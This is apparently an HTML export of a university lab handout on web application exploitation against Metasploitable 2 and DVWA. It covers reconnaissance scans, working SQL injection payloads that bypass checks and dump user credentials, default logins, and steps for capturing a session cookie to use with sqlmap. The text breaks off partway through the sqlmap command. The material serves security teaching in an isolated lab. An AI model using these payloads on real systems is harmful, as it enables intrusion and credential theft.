@@ -1,0 +1,1203 @@
+<!DOCTYPE html><html><head>
+      <title>l5_description</title>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      
+      <link rel="stylesheet" href="file:///c:\Users\jafariha\.vscode\extensions\shd101wyy.markdown-preview-enhanced-0.8.20\crossnote\dependencies\katex\katex.min.css">
+      
+      
+      
+      
+      
+      <style>
+      code[class*=language-],pre[class*=language-]{color:#333;background:0 0;font-family:Consolas,"Liberation Mono",Menlo,Courier,monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.4;-moz-tab-size:8;-o-tab-size:8;tab-size:8;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:.8em;overflow:auto;border-radius:3px;background:#f5f5f5}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal;background:#f5f5f5}.token.blockquote,.token.comment{color:#969896}.token.cdata{color:#183691}.token.doctype,.token.macro.property,.token.punctuation,.token.variable{color:#333}.token.builtin,.token.important,.token.keyword,.token.operator,.token.rule{color:#a71d5d}.token.attr-value,.token.regex,.token.string,.token.url{color:#183691}.token.atrule,.token.boolean,.token.code,.token.command,.token.constant,.token.entity,.token.number,.token.property,.token.symbol{color:#0086b3}.token.prolog,.token.selector,.token.tag{color:#63a35c}.token.attr-name,.token.class,.token.class-name,.token.function,.token.id,.token.namespace,.token.pseudo-class,.token.pseudo-element,.token.url-reference .token.variable{color:#795da3}.token.entity{cursor:help}.token.title,.token.title .token.punctuation{font-weight:700;color:#1d3e81}.token.list{color:#ed6a43}.token.inserted{background-color:#eaffea;color:#55a532}.token.deleted{background-color:#ffecec;color:#bd2c00}.token.bold{font-weight:700}.token.italic{font-style:italic}.language-json .token.property{color:#183691}.language-markup .token.tag .token.punctuation{color:#333}.language-css .token.function,code.language-css{color:#0086b3}.language-yaml .token.atrule{color:#63a35c}code.language-yaml{color:#183691}.language-ruby .token.function{color:#333}.language-markdown .token.url{color:#795da3}.language-makefile .token.symbol{color:#795da3}.language-makefile .token.variable{color:#183691}.language-makefile .token.builtin{color:#0086b3}.language-bash .token.keyword{color:#0086b3}pre[data-line]{position:relative;padding:1em 0 1em 3em}pre[data-line] .line-highlight-wrapper{position:absolute;top:0;left:0;background-color:transparent;display:block;width:100%}pre[data-line] .line-highlight{position:absolute;left:0;right:0;padding:inherit 0;margin-top:1em;background:hsla(24,20%,50%,.08);background:linear-gradient(to right,hsla(24,20%,50%,.1) 70%,hsla(24,20%,50%,0));pointer-events:none;line-height:inherit;white-space:pre}pre[data-line] .line-highlight:before,pre[data-line] .line-highlight[data-end]:after{content:attr(data-start);position:absolute;top:.4em;left:.6em;min-width:1em;padding:0 .5em;background-color:hsla(24,20%,50%,.4);color:#f4f1ef;font:bold 65%/1.5 sans-serif;text-align:center;vertical-align:.3em;border-radius:999px;text-shadow:none;box-shadow:0 1px #fff}pre[data-line] .line-highlight[data-end]:after{content:attr(data-end);top:auto;bottom:.4em}html body{font-family:'Helvetica Neue',Helvetica,'Segoe UI',Arial,freesans,sans-serif;font-size:16px;line-height:1.6;color:#333;background-color:#fff;overflow:initial;box-sizing:border-box;word-wrap:break-word}html body>:first-child{margin-top:0}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{line-height:1.2;margin-top:1em;margin-bottom:16px;color:#000}html body h1{font-size:2.25em;font-weight:300;padding-bottom:.3em}html body h2{font-size:1.75em;font-weight:400;padding-bottom:.3em}html body h3{font-size:1.5em;font-weight:500}html body h4{font-size:1.25em;font-weight:600}html body h5{font-size:1.1em;font-weight:600}html body h6{font-size:1em;font-weight:600}html body h1,html body h2,html body h3,html body h4,html body h5{font-weight:600}html body h5{font-size:1em}html body h6{color:#5c5c5c}html body strong{color:#000}html body del{color:#5c5c5c}html body a:not([href]){color:inherit;text-decoration:none}html body a{color:#08c;text-decoration:none}html body a:hover{color:#00a3f5;text-decoration:none}html body img{max-width:100%}html body>p{margin-top:0;margin-bottom:16px;word-wrap:break-word}html body>ol,html body>ul{margin-bottom:16px}html body ol,html body ul{padding-left:2em}html body ol.no-list,html body ul.no-list{padding:0;list-style-type:none}html body ol ol,html body ol ul,html body ul ol,html body ul ul{margin-top:0;margin-bottom:0}html body li{margin-bottom:0}html body li.task-list-item{list-style:none}html body li>p{margin-top:0;margin-bottom:0}html body .task-list-item-checkbox{margin:0 .2em .25em -1.8em;vertical-align:middle}html body .task-list-item-checkbox:hover{cursor:pointer}html body blockquote{margin:16px 0;font-size:inherit;padding:0 15px;color:#5c5c5c;background-color:#f0f0f0;border-left:4px solid #d6d6d6}html body blockquote>:first-child{margin-top:0}html body blockquote>:last-child{margin-bottom:0}html body hr{height:4px;margin:32px 0;background-color:#d6d6d6;border:0 none}html body table{margin:10px 0 15px 0;border-collapse:collapse;border-spacing:0;display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}html body table th{font-weight:700;color:#000}html body table td,html body table th{border:1px solid #d6d6d6;padding:6px 13px}html body dl{padding:0}html body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:700}html body dl dd{padding:0 16px;margin-bottom:16px}html body code{font-family:Menlo,Monaco,Consolas,'Courier New',monospace;font-size:.85em;color:#000;background-color:#f0f0f0;border-radius:3px;padding:.2em 0}html body code::after,html body code::before{letter-spacing:-.2em;content:'\00a0'}html body pre>code{padding:0;margin:0;word-break:normal;white-space:pre;background:0 0;border:0}html body .highlight{margin-bottom:16px}html body .highlight pre,html body pre{padding:1em;overflow:auto;line-height:1.45;border:#d6d6d6;border-radius:3px}html body .highlight pre{margin-bottom:0;word-break:normal}html body pre code,html body pre tt{display:inline;max-width:initial;padding:0;margin:0;overflow:initial;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}html body pre code:after,html body pre code:before,html body pre tt:after,html body pre tt:before{content:normal}html body blockquote,html body dl,html body ol,html body p,html body pre,html body ul{margin-top:0;margin-bottom:16px}html body kbd{color:#000;border:1px solid #d6d6d6;border-bottom:2px solid #c7c7c7;padding:2px 4px;background-color:#f0f0f0;border-radius:3px}@media print{html body{background-color:#fff}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{color:#000;page-break-after:avoid}html body blockquote{color:#5c5c5c}html body pre{page-break-inside:avoid}html body table{display:table}html body img{display:block;max-width:100%;max-height:100%}html body code,html body pre{word-wrap:break-word;white-space:pre}}.markdown-preview{width:100%;height:100%;box-sizing:border-box}.markdown-preview ul{list-style:disc}.markdown-preview ul ul{list-style:circle}.markdown-preview ul ul ul{list-style:square}.markdown-preview ol{list-style:decimal}.markdown-preview ol ol,.markdown-preview ul ol{list-style-type:lower-roman}.markdown-preview ol ol ol,.markdown-preview ol ul ol,.markdown-preview ul ol ol,.markdown-preview ul ul ol{list-style-type:lower-alpha}.markdown-preview .newpage,.markdown-preview .pagebreak{page-break-before:always}.markdown-preview pre.line-numbers{position:relative;padding-left:3.8em;counter-reset:linenumber}.markdown-preview pre.line-numbers>code{position:relative}.markdown-preview pre.line-numbers .line-numbers-rows{position:absolute;pointer-events:none;top:1em;font-size:100%;left:0;width:3em;letter-spacing:-1px;border-right:1px solid #999;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-preview pre.line-numbers .line-numbers-rows>span{pointer-events:none;display:block;counter-increment:linenumber}.markdown-preview pre.line-numbers .line-numbers-rows>span:before{content:counter(linenumber);color:#999;display:block;padding-right:.8em;text-align:right}.markdown-preview .mathjax-exps .MathJax_Display{text-align:center!important}.markdown-preview:not([data-for=preview]) .code-chunk .code-chunk-btn-group{display:none}.markdown-preview:not([data-for=preview]) .code-chunk .status{display:none}.markdown-preview:not([data-for=preview]) .code-chunk .output-div{margin-bottom:16px}.markdown-preview .md-toc{padding:0}.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link{display:inline;padding:.25rem 0}.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link div,.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link p{display:inline}.markdown-preview .md-toc .md-toc-link-wrapper.highlighted .md-toc-link{font-weight:800}.scrollbar-style::-webkit-scrollbar{width:8px}.scrollbar-style::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}.scrollbar-style::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,.66);border:4px solid rgba(150,150,150,.66);background-clip:content-box}html body[for=html-export]:not([data-presentation-mode]){position:relative;width:100%;height:100%;top:0;left:0;margin:0;padding:0;overflow:auto}html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{position:relative;top:0;min-height:100vh}@media screen and (min-width:914px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{padding:2em calc(50% - 457px + 2em)}}@media screen and (max-width:914px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{font-size:14px!important;padding:1em}}@media print{html body[for=html-export]:not([data-presentation-mode]) #sidebar-toc-btn{display:none}}html body[for=html-export]:not([data-presentation-mode]) #sidebar-toc-btn{position:fixed;bottom:8px;left:8px;font-size:28px;cursor:pointer;color:inherit;z-index:99;width:32px;text-align:center;opacity:.4}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] #sidebar-toc-btn{opacity:1}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc{position:fixed;top:0;left:0;width:300px;height:100%;padding:32px 0 48px 0;font-size:14px;box-shadow:0 0 4px rgba(150,150,150,.33);box-sizing:border-box;overflow:auto;background-color:inherit}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar{width:8px}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,.66);border:4px solid rgba(150,150,150,.66);background-clip:content-box}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc a{text-decoration:none}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc{padding:0 16px}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link{display:inline;padding:.25rem 0}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link div,html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link p{display:inline}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper.highlighted .md-toc-link{font-weight:800}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{left:300px;width:calc(100% - 300px);padding:2em calc(50% - 457px - 300px / 2);margin:0;box-sizing:border-box}@media screen and (max-width:1274px){html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{width:100%}}html body[for=html-export]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .markdown-preview{left:50%;transform:translateX(-50%)}html body[for=html-export]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .md-sidebar-toc{display:none}
+.mume .markdown-preview {
+  background: #ffe4e1 !important;
+  color: #583030 !important;
+  font-family: "Georgia", "Times New Roman", serif !important;
+  line-height: 1.6;
+}
+.mume .markdown-preview h1,
+.mume .markdown-preview h2,
+.mume .markdown-preview h3 {
+  font-family: "Helvetica Neue", Arial, sans-serif !important;
+  font-weight: 600;
+}
+
+      </style>
+      <!-- The content below will be included at the end of the <head> element. --><script type="text/javascript">
+  document.addEventListener("DOMContentLoaded", function () {
+    // your code here
+  });
+</script></head><body for="html-export">
+    
+    
+      <div class="crossnote markdown-preview  ">
+      
+<h2 id="-lab-5-web-application-exploitation"><strong>📌 Lab 5: Web Application Exploitation</strong> </h2>
+<h4 id="csci-5742-cybersecurity-programming-and-analytics-spring-2026">CSCI 5742: Cybersecurity Programming and Analytics, Spring 2026 </h4>
+<h4 id="total-points-100">Total Points: 100 </h4>
+<hr>
+<h2 id="-introduction"><strong>📢 Introduction</strong> </h2>
+<p>This lab focuses on <strong>web application exploitation</strong> using <strong>Kali Linux</strong> to attack vulnerable <strong>web services</strong> hosted on <strong>Metasploitable 2 (M2)</strong>. You will:</p>
+<p>✔️ <strong>Identify vulnerable web services</strong> running on M2.<br>
+✔️ <strong>Exploit web vulnerabilities</strong> such as <strong>SQL Injection, Cross-Site Scripting (XSS), Path Traversal, and CSRF</strong>.<br>
+✔️ <strong>Learn how attackers abuse web vulnerabilities and how to mitigate them</strong>.</p>
+<hr>
+<h2 id="-rubric-for-lab-5-web-application-exploitation"><strong>📌 Rubric for Lab 5: Web Application Exploitation</strong> </h2>
+<table>
+<thead>
+<tr>
+<th><strong>Part</strong></th>
+<th><strong>Description</strong></th>
+<th><strong>Points</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Part 1: Reconnaissance &amp; Web Scanning</strong></td>
+<td>Use <code>nmap</code>, <code>dirb</code>, <code>whatweb</code>, <code>nikto</code> to identify open ports, web services, and hidden directories.</td>
+<td><strong>10</strong></td>
+</tr>
+<tr>
+<td><strong>Part 2: SQL Injection (SQLi)</strong></td>
+<td>Use <code>SQLmap</code> to exploit a vulnerable input field in <strong>DVWA</strong> and extract credentials.</td>
+<td><strong>30</strong></td>
+</tr>
+<tr>
+<td><strong>Part 3: Cross-Site Scripting (XSS)</strong></td>
+<td>Exploit <strong>Reflected and Stored XSS</strong> in <strong>DVWA/Mutillidae</strong> to inject JavaScript and demonstrate cookie theft (session capture).</td>
+<td><strong>30</strong></td>
+</tr>
+<tr>
+<td><strong>Part 4: Directory Traversal (LFI)</strong></td>
+<td>Perform <strong>Local File Inclusion (LFI)</strong> to access sensitive files on the server (e.g., <code>/etc/passwd</code>) and explain impact.</td>
+<td><strong>15</strong></td>
+</tr>
+<tr>
+<td><strong>Part 5: Cross-Site Request Forgery (CSRF)</strong></td>
+<td>Craft a <strong>CSRF exploit</strong> in <strong>DVWA</strong> to perform unauthorized actions on behalf of a logged-in user and explain mitigations.</td>
+<td><strong>15</strong></td>
+</tr>
+<tr>
+<td><strong>Total</strong></td>
+<td>Demonstrate understanding of web exploitation techniques, evidence capture, and high-level mitigation strategies.</td>
+<td><strong>100</strong></td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h1 id="️-lab-environment-setup"><strong>⚙️ Lab Environment Setup</strong> </h1>
+<p>📌 You will use <strong>two</strong> virtual machines (<strong>VMs</strong>) in the same LAN (<code>192.168.10.0/24</code>):<br>
+1️⃣ <strong>Kali Linux (Attacker VM)</strong> – Used to launch web attacks.<br>
+2️⃣ <strong>Metasploitable 2 (Target VM)</strong> – A deliberately vulnerable web server.</p>
+<p>🔹 <strong>IMPORTANT:</strong><br>
+🔸 Set <code>eth0</code> of both <strong>Kali and M2 in Host-only mode</strong>.<br>
+🔸 <strong>Verify network connectivity:</strong></p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">ping</span> <span class="token operator">&lt;</span>M2-IP<span class="token operator">&gt;</span>
+</code></pre><hr>
+<h2 id="️-part-1-reconnaissance--web-scanning-10-pts"><strong>🛠️ Part 1: Reconnaissance &amp; Web Scanning (10 pts)</strong> </h2>
+<h3 id="-task-1-discover-web-services-5-pts"><strong>🔹 Task 1: Discover Web Services (5 pts)</strong> </h3>
+<h4 id="-goal"><strong>📌 Goal:</strong> </h4>
+<p>✔️ Identify <strong>which ports are hosting web applications</strong> on Metasploitable 2.<br>
+✔️ Determine <strong>which web services are running</strong> (e.g., DVWA, Mutillidae).</p>
+<h4 id="-step-1-run-nmap-to-detect-open-web-ports"><strong>🔹 Step 1: Run Nmap to Detect Open Web Ports</strong> </h4>
+<p>📌 Open <strong>Kali Linux</strong> terminal and execute:</p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>nmap <span class="token parameter variable">-p</span> <span class="token number">80,443</span>,8080,8180 <span class="token parameter variable">--open</span> <span class="token operator">&lt;</span>M2-IP<span class="token operator">&gt;</span>
+</code></pre><p>🔹 <strong>Explanation of the command:</strong></p>
+<ul>
+<li><code>-p 80,443,8080,8180</code> → Scans for <strong>web-related ports</strong>.</li>
+<li><code>--open</code> → Filters out closed ports, showing <strong>only active services</strong>.</li>
+</ul>
+<h4 id="-step-2-analyze-the-web-services"><strong>🔹 Step 2: Analyze the Web Services</strong> </h4>
+<p>📌 Open a <strong>web browser</strong> in Kali and visit the following URLs:</p>
+<ul>
+<li><code>http://&lt;M2-IP&gt;/dvwa</code> → DVWA (Damn Vulnerable Web App)</li>
+<li><code>http://&lt;M2-IP&gt;/mutillidae</code> → Mutillidae Web Application</li>
+<li><code>http://&lt;M2-IP&gt;:8180/manager/html</code> → Tomcat Manager (potential admin panel)</li>
+</ul>
+<h4 id="-deliverables-for-task-1">📌 Deliverables for Task 1: </h4>
+<p>✅ Screenshot: Nmap scan results showing open web ports.<br>
+✅ Answer the following questions:</p>
+<ul>
+<li><strong>Q1.</strong> Which ports are hosting web services?</li>
+<li><strong>Q2.</strong> What web applications are running on this system and on what ports?</li>
+</ul>
+<hr>
+<h3 id="-task-2-web-directory-enumeration-5-pts"><strong>🔹 Task 2: Web Directory Enumeration (5 pts)</strong> </h3>
+<h4 id="-goal-1"><strong>📌 Goal:</strong> </h4>
+<p>✔️ Identify <strong>hidden directories and files</strong> that might contain <strong>sensitive information</strong>.<br>
+✔️ Find <strong>login panels, config files, and admin pages</strong> that could be exploited.</p>
+<h4 id="-step-1-scan-for-web-directories-with-dirb"><strong>🔹 Step 1: Scan for Web Directories with <code>dirb</code></strong> </h4>
+<p>📌 Run the followings command to find hidden directories:</p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>dirb http://<span class="token operator">&lt;</span>M2-IP<span class="token operator">&gt;</span>
+dirb http://<span class="token operator">&lt;</span>M2-IP<span class="token operator">&gt;</span>/dvwa/
+dirb http://<span class="token operator">&lt;</span>M2-IP<span class="token operator">&gt;</span>/mutillidae/
+</code></pre><p>🔹 <strong>Explanation of the command:</strong></p>
+<ul>
+<li><code>dirb</code> is a <strong>brute-force directory scanner</strong>.</li>
+<li>It <strong>sends requests for common directories</strong> and checks if they exist.</li>
+</ul>
+<h4 id="-step-2-perform-a-deeper-scan-for-file-extensions"><strong>🔹 Step 2: Perform a Deeper Scan for File Extensions</strong> </h4>
+<p>📌 Scan for <strong>PHP files</strong> that may contain <strong>login pages, admin panels, or vulnerable scripts</strong>:</p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>dirb http://<span class="token operator">&lt;</span>M2-IP<span class="token operator">&gt;</span> <span class="token parameter variable">-X</span> .php
+</code></pre><p>🔹 <strong>Explanation of the command:</strong></p>
+<ul>
+<li><code>-X .php</code> → Limits scan to <strong>PHP files</strong> (useful for <strong>PHP-based web apps</strong>).</li>
+</ul>
+<h4 id="-deliverables-for-task-2">📌 Deliverables for Task 2: </h4>
+<p>✅ Screenshot: dirb scan results showing discovered directories.<br>
+✅ Answer the following questions:</p>
+<ul>
+<li><strong>Q3.</strong> List three important directories found by dirb.</li>
+<li><strong>Q4.</strong> Why is directory enumeration useful for web attacks?</li>
+</ul>
+<hr>
+<h3 id="-task-3-identify-technologies-used-by-the-web-apps"><strong>🔹 Task 3: Identify Technologies Used by the Web Apps</strong> </h3>
+<p>📌 <strong>Run WhatWeb to Identify Technologies:</strong></p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>whatweb http://<span class="token operator">&lt;</span>M2-IP<span class="token operator">&gt;</span>
+</code></pre><p>🔹 <strong>Example Output:</strong></p>
+<pre data-role="codeBlock" data-info="text" class="language-text text"><code>http://192.168.10.4 [200 OK] Apache[2.2.8], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.8 (Ubuntu) DAV/2], IP[192.168.10.4], PHP[5.2.4-2ubuntu5.10], Title[Metasploitable2 - Linux], WebDAV[2], X-Powered-By[PHP/5.2.4-2ubuntu5.10]
+</code></pre><ul>
+<li><strong>Apache 2.2.8 (Ubuntu)</strong> → May have <strong>known vulnerabilities</strong> (check CVEs).</li>
+<li><strong>PHP 5.2.4</strong> → <strong>Outdated PHP version</strong>, potentially vulnerable depending on modules/config.</li>
+<li><strong>WebDAV (DAV/2)</strong> → Often a <strong>misconfiguration target</strong> (weak auth, unsafe methods like <code>PUT</code>, <code>PROPFIND</code>, etc.).</li>
+</ul>
+<h4 id="-deliverables-for-task-3">📌 Deliverables for Task 3: </h4>
+<p>✅ Screenshot: whatweb scan results showing detected web technologies.<br>
+✅ Answer the following question:</p>
+<ul>
+<li><strong>Q5.</strong> How could knowing the technology stack help an attacker?</li>
+</ul>
+<hr>
+<h3 id="-task-4-web-server-vulnerability--misconfiguration-scan-with-nikto"><strong>🔹 Task 4: Web Server Vulnerability &amp; Misconfiguration Scan with Nikto</strong> </h3>
+<h4 id="-goal-2">📌 <strong>Goal:</strong> </h4>
+<p>✔️ Identify common <strong>web server misconfigurations</strong> and <strong>known risky files/settings</strong>.<br>
+✔️ Gather evidence that helps prioritize what to test in later parts (SQLi/XSS/LFI/CSRF).</p>
+<h4 id="-step-1-run-nikto-against-the-web-server"><strong>🔹 Step 1: Run Nikto Against the Web Server</strong> </h4>
+<p>📌 On <strong>Kali Linux</strong>, run:</p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>nikto <span class="token parameter variable">-h</span> http://<span class="token operator">&lt;</span>M2-IP<span class="token operator">&gt;</span>
+</code></pre><h4 id="-step-2-optional-save-output-to-a-file"><strong>🔹 Step 2 (Optional): Save Output to a File</strong> </h4>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>nikto <span class="token parameter variable">-h</span> http://<span class="token operator">&lt;</span>M2-IP<span class="token operator">&gt;</span> <span class="token parameter variable">-o</span> nikto_<span class="token operator">&lt;</span>M2-IP<span class="token operator">&gt;</span>.txt
+</code></pre><h4 id="-what-this-tells-us-examples"><strong>🔹 What This Tells Us (Examples)</strong> </h4>
+<ul>
+<li>Reveals <strong>risky HTTP methods</strong>, <strong>default files</strong>, <strong>directory listing</strong>, and <strong>server configuration issues</strong>.</li>
+<li>Highlights <strong>outdated server components</strong> and potential <strong>attack surface</strong> to investigate next.</li>
+</ul>
+<h4 id="-deliverables-for-task-4">📌 Deliverables for Task 4: </h4>
+<p>✅ Screenshot: Nikto results (terminal output).<br>
+✅ Answer the following questions:</p>
+<ul>
+<li><strong>Q6.</strong> List <strong>two</strong> findings Nikto reported (e.g., risky methods, interesting files/paths, headers).</li>
+<li><strong>Q7.</strong> For <strong>one</strong> finding, explain how it could be leveraged in a real attack scenario (high level).</li>
+</ul>
+<div style="text-align: center; margin: 15px 1;">
+    <hr style="border: 5px; height: 20px; width: 100%;">
+</div>
+<h2 id="-part-2-sql-injection-sqli-30-pts"><strong>🔹 Part 2: SQL Injection (SQLi) (30 pts)</strong> </h2>
+<h2 id="-objective"><strong>📌 Objective:</strong> </h2>
+<p>✔️ Understand <strong>how SQL Injection (SQLi) works</strong>.<br>
+✔️ Manually <strong>bypass authentication</strong> using SQLi.<br>
+✔️ Use <strong>SQLmap</strong> to automate SQL Injection and extract sensitive data.<br>
+✔️ Learn <strong>how attackers exploit poorly secured databases</strong> and how to mitigate SQLi risks.</p>
+<hr>
+<h3 id="-task-1-manually-exploit-sql-injection-in-dvwa-15-pts"><strong>🔹 Task 1: Manually Exploit SQL Injection in DVWA (15 pts)</strong> </h3>
+<p>📌 <strong>In this task, you will manually exploit SQL Injection to bypass login authentication.</strong></p>
+<h4 id="-step-1-open-dvwa-and-access-the-sql-injection-page"><strong>🔹 Step 1: Open DVWA and Access the SQL Injection Page</strong> </h4>
+<ol>
+<li><strong>Launch DVWA in your browser:</strong><pre data-role="codeBlock" data-info="text" class="language-text text"><code>http://&lt;M2-IP&gt;/dvwa
+</code></pre></li>
+<li><strong>Login using default credentials:</strong>
+<ul>
+<li><strong>Username:</strong> <code>admin</code></li>
+<li><strong>Password:</strong> <code>password</code></li>
+</ul>
+</li>
+<li>Navigate to <strong>DVWA Security</strong> settings → Set Security Level to <strong>Low</strong>.</li>
+<li>Open the <strong>SQL Injection</strong> page.</li>
+</ol>
+<hr>
+<h4 id="-step-2-try-a-basic-authentication-bypass"><strong>🔹 Step 2: Try a Basic Authentication Bypass</strong> </h4>
+<p>📌 <strong>Select <em>SQL Injection</em> from left menu. Enter the following SQL Injection payload in the "User ID" field and submit:</strong></p>
+<pre data-role="codeBlock" data-info="sql" class="language-sql sql"><code><span class="token string">' OR '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span>' <span class="token comment">#</span>
+</code></pre><h5 id="-explanation-of-the-payload"><strong>📝 Explanation of the Payload:</strong> </h5>
+<ul>
+<li><code>'</code> → Closes the current SQL string.</li>
+<li><code>OR '1'='1'</code> → Always evaluates to <strong>TRUE</strong>.</li>
+<li><code>#</code> → Comments out the rest of the query, preventing errors.</li>
+</ul>
+<p>📌 <strong>Expected Outcome:</strong></p>
+<ul>
+<li>You should see <strong>all user records</strong> displayed on the page.</li>
+<li>This proves that the <strong>application is vulnerable</strong> to SQL Injection.</li>
+</ul>
+<h4 id="-step-3-extract-user-credentials-from-the-database"><strong>🔹 Step 3: Extract User Credentials from the Database</strong> </h4>
+<p>📌 <strong>Enter this SQL Injection payload to retrieve more data:</strong></p>
+<pre data-role="codeBlock" data-info="sql" class="language-sql sql"><code>' <span class="token keyword keyword-UNION">UNION</span> <span class="token keyword keyword-SELECT">SELECT</span> <span class="token keyword keyword-user">user</span><span class="token punctuation">,</span>password <span class="token keyword keyword-FROM">FROM</span> users <span class="token comment">#</span>
+</code></pre><h4 id="-explanation-of-the-payload-1"><strong>📝 Explanation of the Payload:</strong> </h4>
+<ul>
+<li><code>UNION SELECT</code> → Combines the results of two queries.</li>
+<li><code>user, password FROM users</code> → Retrieves usernames and passwords from the <code>users</code> table.</li>
+</ul>
+<p>📌 <strong>Expected Outcome:</strong></p>
+<ul>
+<li>The application <strong>displays user credentials</strong> from the database.</li>
+<li>This proves that SQL Injection can <strong>extract sensitive information</strong>.</li>
+</ul>
+<hr>
+<h4 id="-deliverables-for-task-1-1">📌 Deliverables for Task 1: </h4>
+<p>✅ Screenshot: SQL Injection authentication bypass success, displaying all user records.<br>
+✅ Screenshot: Extracted user credentials using the SQL Injection payload.<br>
+✅ Answers the following questions:</p>
+<ul>
+<li><strong>Q8.</strong> What happens when you submit this input?</li>
+<li><strong>Q9.</strong> Why does the server return valid results?</li>
+</ul>
+<hr>
+<h3 id="-task-2-automate-sql-injection-with-sqlmap-15-pts"><strong>🔹 Task 2: Automate SQL Injection with SQLmap (15 pts)</strong> </h3>
+<h4 id="goal"><strong>Goal</strong> </h4>
+<p>📌 <strong>Now, let's use SQLmap to automate the attack.</strong><br>
+📌 <strong>SQLmap is a powerful tool that can:</strong><br>
+✅ <strong>Detect SQL Injection vulnerabilities.</strong><br>
+✅ <strong>Dump database contents.</strong><br>
+✅ <strong>Find administrator credentials.</strong><br>
+✅ <strong>Execute system commands (if possible).</strong></p>
+<hr>
+<h4 id="-step-1-retrieve-the-phpsessid-from-browser-cookies"><strong>🔹 Step 1: Retrieve the <code>PHPSESSID</code> from Browser Cookies</strong> </h4>
+<p>📌 <strong>Before running SQLMap, you need to extract your <code>PHPSESSID</code> to authenticate the request.</strong></p>
+<p>1️⃣ <strong>Open DVWA in Your Browser:</strong></p>
+<pre data-role="codeBlock" data-info="text" class="language-text text"><code>http://&lt;M2-IP&gt;/dvwa
+</code></pre><p>2️⃣ <strong>Log in Using Default Credentials:</strong></p>
+<ul>
+<li><strong>Username:</strong> <code>admin</code></li>
+<li><strong>Password:</strong> <code>password</code></li>
+</ul>
+<p>3️⃣ <strong>Open Developer Tools (<code>F12</code>)</strong></p>
+<ul>
+<li>On <strong>Chrome or Edge</strong>: Press <strong><code>F12</code></strong> or <strong><code>Ctrl + Shift + I</code></strong>.</li>
+<li>On <strong>Firefox</strong>: Press <strong><code>F12</code></strong> or <strong><code>Ctrl + Shift + I</code></strong>.</li>
+<li>Go to the <strong>Application</strong> tab (Chrome/Edge) or <strong>Storage</strong> tab (Firefox).</li>
+</ul>
+<p>4️⃣ <strong>Navigate to Cookies:</strong></p>
+<ul>
+<li>Expand <strong>Storage (Firefox) / Application (Chrome)</strong>.</li>
+<li>Click on <strong>Cookies</strong> → Select <code>http://&lt;M2-IP&gt;</code> (your DVWA site).</li>
+</ul>
+<p>5️⃣ <strong>Find the <code>PHPSESSID</code> Cookie:</strong></p>
+<ul>
+<li>Look for the <strong><code>PHPSESSID</code></strong> value in the list.</li>
+<li><strong>Copy the full value</strong> (right-click → copy).</li>
+</ul>
+<hr>
+<h4 id="-step-2-use-sqlmap-with-the-correct-session-id"><strong>🔹 Step 2: Use SQLMap with the Correct Session ID</strong> </h4>
+<p>📌 <strong>Now, run SQLMap with the retrieved <code>PHPSESSID</code>:</strong></p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://&lt;M2-IP&gt;/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit"</span> <span class="token punctuation">\</span>
